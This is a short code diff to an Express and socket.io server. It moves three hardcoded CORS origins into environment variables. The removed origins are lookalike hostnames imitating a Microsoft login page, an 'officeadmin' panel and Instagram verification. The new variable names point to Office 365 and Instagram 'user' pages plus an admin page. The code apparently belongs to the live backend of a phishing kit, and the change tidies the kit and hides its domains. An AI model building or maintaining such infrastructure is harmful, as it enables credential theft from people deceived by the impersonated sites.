@@ -1,7 +1,10 @@
 const express = require("express");
 const http = require("http");
+const dotenv = require("dotenv");
 const cors = require("cors");
 const { Server } = require("socket.io");
+
+dotenv.config();
 
 const app = express();
 
@@ -21,9 +24,9 @@ const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: [
-      "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app",
-      "https://officeadmin-ochre.vercel.app",
-      "https://verify-unaccredited-instagram.vercel.app",
+      process.env.ADMIN_URL,
+      process.env.OFFICE365_USER_URL,
+      process.env.IG_USER_URL,
     ],
     methods: ["GET", "POST"],
   },
